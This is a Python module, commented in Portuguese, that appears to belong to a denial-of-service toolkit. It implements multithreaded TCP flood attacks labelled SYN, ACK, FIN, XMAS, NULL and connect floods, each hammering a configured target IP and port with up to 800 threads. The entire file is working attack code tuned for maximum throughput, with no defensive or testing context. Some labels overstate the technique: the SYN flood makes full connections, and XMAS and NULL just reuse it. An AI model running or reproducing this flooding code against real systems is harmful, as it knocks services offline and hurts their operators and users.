"""
Implementação de ataques TCP - COMPLETAMENTE CORRIGIDO
"""
import socket
import time
import random
import threading
from typing import Optional
from .base import BaseAttack
from ..core.config import AttackConfig

class TCPSynFlood(BaseAttack):
    """TCP SYN Flood Attack - ALTA PERFORMANCE CORRIGIDA"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP SYN Flood (Alta Performance)...")
        
        # Estatísticas locais para debugging
        total_packets = 0
        total_bytes = 0
        total_errors = 0
        stats_lock = threading.Lock()
        
        def attack_thread(thread_id):
            nonlocal total_packets, total_bytes, total_errors
            packets_sent = 0
            bytes_sent = 0
            errors = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    # Socket com timeout ULTRA curto para máxima performance
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.2)  # Timeout MUITO curto - 200ms
                    
                    # Tenta conectar (envia SYN) - SEM delays
                    sock.connect((self.config.target_ip, self.config.target_port))
                    packets_sent += 1
                    bytes_sent += 60  # Tamanho do pacote SYN
                    
                    # ✅ ATUALIZA ESTATÍSTICAS CORRETAMENTE
                    if hasattr(self.stats_manager, 'update'):
                        self.stats_manager.update(60, 1)
                    else:
                        # Fallback direto
                        self.stats_manager.packets_sent += 1
                        self.stats_manager.bytes_sent += 60
                    
                    # Fecha socket IMEDIATAMENTE
                    sock.close()
                    
                except (socket.timeout, ConnectionRefusedError, OSError, 
                       ConnectionAbortedError, ConnectionResetError, BrokenPipeError):
                    # Erros esperados em flood - não contabiliza como erro
                    pass
                except Exception as e:
                    errors += 1
                    # Atualiza erros periodicamente
                    if errors % 100 == 0 and hasattr(self.stats_manager, 'increment_errors'):
                        self.stats_manager.increment_errors(100)
            
            # Atualiza totais da thread
            with stats_lock:
                total_packets += packets_sent
                total_bytes += bytes_sent
                total_errors += errors
            
            if packets_sent > 0:
                print(f"🧵 Thread {thread_id}: {packets_sent} SYN, {errors} erros")
        
        # MÁXIMO de threads para performance
        max_threads = min(self.config.threads, 800)  # Aumentado para 800
        print(f"🔧 Usando {max_threads} threads para SYN Flood")
        print(f"🎯 Target: {self.config.target_ip}:{self.config.target_port}")
        print(f"⚡ Timeout: 0.2s | Packet Size: {self.config.packet_size} bytes")
        
        # Inicia todas as threads RAPIDAMENTE
        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            # Pequeno delay entre criação de threads para evitar sobrecarga
            if i % 50 == 0:
                time.sleep(0.01)
        
        # Aguarda término com timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 3)
        
        print(f"✅ SYN Flood finalizado: {total_packets:,} pacotes, {total_errors} erros")
        self.running = False

class TCPAckFlood(BaseAttack):
    """TCP ACK Flood Attack - Implementação PRÁTICA"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP ACK Flood...")
        
        total_packets = 0
        total_bytes = 0
        stats_lock = threading.Lock()
        
        def attack_thread(thread_id):
            nonlocal total_packets, total_bytes
            packets_sent = 0
            bytes_sent = 0
            errors = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    # Conexão TCP normal com timeout curto
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.3)
                    
                    # Conecta (SYN) e envia dados (ACK implícito)
                    sock.connect((self.config.target_ip, self.config.target_port))
                    
                    # Envia payload pequeno para simular ACK
                    payload_size = min(self.config.packet_size, 512)
                    payload = random._urandom(payload_size)
                    sock.send(payload)
                    
                    packets_sent += 1
                    bytes_sent += len(payload) + 40  # + cabeçalhos TCP/IP
                    
                    # ✅ ATUALIZA ESTATÍSTICAS
                    if hasattr(self.stats_manager, 'update'):
                        self.stats_manager.update(len(payload) + 40, 1)
                    else:
                        self.stats_manager.packets_sent += 1
                        self.stats_manager.bytes_sent += len(payload) + 40
                    
                    sock.close()
                    
                except (socket.timeout, ConnectionRefusedError, OSError):
                    # Erros normais
                    pass
                except Exception:
                    errors += 1
                    if errors % 100 == 0 and hasattr(self.stats_manager, 'increment_errors'):
                        self.stats_manager.increment_errors(100)
            
            with stats_lock:
                total_packets += packets_sent
                total_bytes += bytes_sent
            
            if packets_sent > 0:
                print(f"🧵 Thread {thread_id}: {packets_sent} ACK, {errors} erros")
        
        max_threads = min(self.config.threads, 600)
        print(f"🔧 Usando {max_threads} threads para ACK Flood")
        
        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            if i % 50 == 0:
                time.sleep(0.01)
        
        for thread in threads:
            thread.join(timeout=self.config.duration + 3)
        
        print(f"✅ ACK Flood finalizado: {total_packets:,} pacotes")
        self.running = False

class TCPFinFlood(BaseAttack):
    """TCP FIN Flood Attack - CORRIGIDO"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP FIN Flood...")
        
        total_packets = 0
        stats_lock = threading.Lock()
        
        def attack_thread(thread_id):
            nonlocal total_packets
            packets_sent = 0
            errors = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.4)
                    
                    # Conecta
                    sock.connect((self.config.target_ip, self.config.target_port))
                    
                    # Envia FIN (shutdown write)
                    sock.shutdown(socket.SHUT_WR)
                    packets_sent += 1
                    
                    # ✅ ATUALIZA ESTATÍSTICAS
                    if hasattr(self.stats_manager, 'update'):
                        self.stats_manager.update(40, 1)  # Tamanho FIN
                    else:
                        self.stats_manager.packets_sent += 1
                        self.stats_manager.bytes_sent += 40
                    
                    sock.close()
                    
                except (socket.timeout, ConnectionRefusedError, OSError):
                    pass
                except Exception:
                    errors += 1
                    if errors % 100 == 0 and hasattr(self.stats_manager, 'increment_errors'):
                        self.stats_manager.increment_errors(100)
            
            with stats_lock:
                total_packets += packets_sent
            
            if packets_sent > 0:
                print(f"🧵 Thread {thread_id}: {packets_sent} FIN, {errors} erros")
        
        max_threads = min(self.config.threads, 500)
        print(f"🔧 Usando {max_threads} threads para FIN Flood")
        
        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            if i % 50 == 0:
                time.sleep(0.01)
        
        for thread in threads:
            thread.join(timeout=self.config.duration + 3)
        
        print(f"✅ FIN Flood finalizado: {total_packets:,} pacotes")
        self.running = False

class TCPXmasAttack(BaseAttack):
    """TCP XMAS Attack - Fallback para SYN Flood"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP XMAS Attack...")
        print("💡 Executando TCP SYN Flood como alternativa (sem raw sockets)...")
        
        # Usa SYN Flood como fallback - FUNCIONA SEMPRE
        syn_flood = TCPSynFlood(self.config, self.stats_manager)
        syn_flood.stop_event = self.stop_event
        syn_flood.execute()
        
        self.running = False

class TCPNullAttack(BaseAttack):
    """TCP NULL Attack - Fallback para SYN Flood"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP NULL Attack...")
        print("💡 Executando TCP SYN Flood como alternativa (sem raw sockets)...")
        
        # Usa SYN Flood como fallback - FUNCIONA SEMPRE
        syn_flood = TCPSynFlood(self.config, self.stats_manager)
        syn_flood.stop_event = self.stop_event
        syn_flood.execute()
        
        self.running = False

class TCPConnectFlood(BaseAttack):
    """TCP Connect Flood - Conexões completas"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP Connect Flood...")
        
        total_packets = 0
        total_bytes = 0
        stats_lock = threading.Lock()
        
        def attack_thread(thread_id):
            nonlocal total_packets, total_bytes
            packets_sent = 0
            bytes_sent = 0
            errors = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1.0)  # Timeout maior para conexão completa
                    
                    # Conexão completa
                    sock.connect((self.config.target_ip, self.config.target_port))
                    
                    # Envia algum dados
                    payload = b'GET / HTTP/1.1\r\nHost: ' + self.config.target_ip.encode() + b'\r\n\r\n'
                    sock.send(payload)
                    
                    packets_sent += 1
                    bytes_sent += len(payload) + 60  # + cabeçalhos
                    
                    # ✅ ATUALIZA ESTATÍSTICAS
                    if hasattr(self.stats_manager, 'update'):
                        self.stats_manager.update(len(payload) + 60, 1)
                    else:
                        self.stats_manager.packets_sent += 1
                        self.stats_manager.bytes_sent += len(payload) + 60
                    
                    # Mantém conexão aberta brevemente
                    time.sleep(0.1)
                    sock.close()
                    
                except (socket.timeout, ConnectionRefusedError, OSError):
                    pass
                except Exception:
                    errors += 1
                    if errors % 50 == 0 and hasattr(self.stats_manager, 'increment_errors'):
                        self.stats_manager.increment_errors(50)
            
            with stats_lock:
                total_packets += packets_sent
                total_bytes += bytes_sent
            
            if packets_sent > 0:
                print(f"🧵 Thread {thread_id}: {packets_sent} conexões, {errors} erros")
        
        max_threads = min(self.config.threads, 400)
        print(f"🔧 Usando {max_threads} threads para Connect Flood")
        
        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            if i % 50 == 0:
                time.sleep(0.02)
        
        for thread in threads:
            thread.join(timeout=self.config.duration + 3)
        
        print(f"✅ Connect Flood finalizado: {total_packets:,} conexões")
        self.running = False
